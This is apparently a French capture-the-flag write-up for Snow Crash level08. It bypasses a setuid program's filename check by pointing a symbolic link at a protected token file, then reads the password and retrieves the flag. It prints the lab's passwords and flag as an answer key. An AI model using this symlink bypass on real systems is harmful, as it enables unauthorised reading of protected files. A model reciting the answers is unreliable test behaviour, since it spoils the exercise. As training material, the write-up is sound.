# Snow Crash – Level08

## 🎯 Objectif  
Accéder au contenu du fichier `token`, protégé et inaccessible directement, en contournant la vérification du nom de fichier.

---

## 📂 1. Fichiers fournis

```bash
level08@SnowCrash:~$ ls -l
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```

- `level08` : exécutable avec les droits `flag08`
- `token` : fichier contenant le mot de passe, mais inaccessible

---

## 🧪 2. Analyse

```bash
level08@SnowCrash:~$ ./level08
./level08 [file to read]
```

Si on tente de lire `token` :

```bash
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
```

Le programme bloque tout nom de fichier contenant `token`.

---

## 🧨 3. Contournement avec un lien symbolique

Créer un **lien symbolique** vers `token` avec un nom différent :

```bash
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/ok
```

Exécuter ensuite avec le nouveau nom :

```bash
level08@SnowCrash:~$ ./level08 /tmp/ok
quif5eloekouj29ke0vouxean
```

---

## 🏁 4. Récupération du flag

Se connecter à l'utilisateur `flag08` avec ce mot de passe :

```bash
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
```

Puis exécuter :

```bash
getflag
```

**Résultat :**
```
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

---

## ✅ Résumé

- 🔐 Mot de passe `flag08` : `quif5eloekouj29ke0vouxean`
- 🏆 Token `flag08` : `25749xKZ8L7DkSCwJkT9dyv6f`
- 🔑 Mot de passe `level09` : `25749xKZ8L7DkSCwJkT9dyv6f`
